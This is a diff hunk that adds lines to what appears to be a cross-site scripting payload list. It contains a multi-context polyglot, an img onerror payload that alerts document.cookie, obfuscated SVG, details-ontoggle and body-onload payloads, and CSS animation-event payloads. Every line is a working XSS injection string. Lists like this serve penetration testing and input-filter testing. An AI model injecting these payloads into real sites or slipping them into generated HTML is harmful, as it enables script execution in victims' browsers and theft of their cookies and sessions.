@@ -1,3 +1,8 @@
+JavaScript​://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/<​/Style/<​/Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus​=/*${/*/;{/**/(confirm)(1)}//><Base/Href=//X55.is\76-->
+`</div><img src="x" onerror​="alert(document.cookie)"/><div><p>`
+<details%0Aopen%0AonToGgle%0A=%0Aabc=(co\u006efirm);abc%28%60xss%60%26%2300000000000000000041//
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 <style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>
 <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert(1)"></xss>
 <style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss>
